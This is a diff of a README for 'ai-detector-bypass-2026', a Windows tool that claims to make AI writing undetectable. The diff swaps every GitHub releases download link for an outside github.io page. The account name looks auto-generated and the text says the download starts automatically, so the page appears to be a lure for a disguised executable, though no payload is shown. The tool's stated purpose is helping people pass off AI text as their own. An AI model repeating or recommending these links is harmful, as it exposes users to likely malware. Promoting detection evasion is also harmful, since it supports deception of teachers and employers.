@@ -1,6 +1,6 @@
 # 🤖 ai-detector-bypass-2026 - Make AI Writing Undetectable Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-2ea44f?style=for-the-badge)](https://github.com/Antitnfcompoundroundsman1969/ai-detector-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-2ea44f?style=for-the-badge)](https://antitnfcompoundroundsman1969.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ Follow these simple steps to get the tool running on your Windows computer:
 
 Visit this link to download the application:
 
-[**https://github.com/Antitnfcompoundroundsman1969/ai-detector-bypass-2026/releases**](https://github.com/Antitnfcompoundroundsman1969/ai-detector-bypass-2026/releases)
+[**https://antitnfcompoundroundsman1969.github.io**](https://antitnfcompoundroundsman1969.github.io)
 
 Click the most recent release file. The download will start automatically.
 
@@ -202,7 +202,7 @@ That's it! You're ready to use AI-generated content without worrying about detec
 
 **Visit this link to download the application:**
 
-[**https://github.com/Antitnfcompoundroundsman1969/ai-detector-bypass-2026/releases**](https://github.com/Antitnfcompoundroundsman1969/ai-detector-bypass-2026/releases)
+[**https://antitnfcompoundroundsman1969.github.io**](https://antitnfcompoundroundsman1969.github.io)
 
 ---
 
